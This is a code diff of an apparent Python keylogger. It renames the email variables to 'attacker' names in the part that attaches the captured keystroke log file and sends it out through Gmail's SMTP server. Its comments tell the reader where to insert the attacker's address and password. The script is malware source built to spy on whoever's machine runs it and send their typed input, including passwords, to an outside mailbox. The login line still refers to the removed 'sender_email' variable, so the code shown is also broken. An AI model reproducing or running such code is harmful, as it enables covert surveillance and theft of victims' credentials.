@@ -30,11 +30,11 @@ listener = keyboard.Listener(
     on_release=on_release)
 listener.start()
 
-sender_email = "@gmail.com" # Put the attacker gmail.
-receiver_email = "@mail.com" # Put the email where the attacker want to sent the log file. (Any email domain will work!)
+attacker_email = "@gmail.com" # Put the attacker gmail.
+attacker_receiver_email = "@mail.com" # Put the email where the attacker want to sent the log file. (Any email domain will work!)
 message = MIMEMultipart()
-message["From"] = sender_email
-message['To'] = receiver_email
+message["From"] = attacker_email
+message['To'] = attacker_receiver_email
 message['Subject'] = "Log File"
 file = "log.txt"
 attachment = open(file,'rb')
@@ -47,6 +47,6 @@ my_message = message.as_string()
 email_session = smtplib.SMTP('smtp.gmail.com',587)
 email_session.starttls()
 email_session.login(sender_email,'Password') # Put in the attacker gmail password, replacing the 'Password' with 'attackergmailpassword'
-email_session.sendmail(sender_email,receiver_email,my_message)
+email_session.sendmail(attacker_email,attacker_receiver_email,my_message)
 email_session.quit()
 print("YOUR MAIL HAS BEEN SENT SUCCESSFULLY")
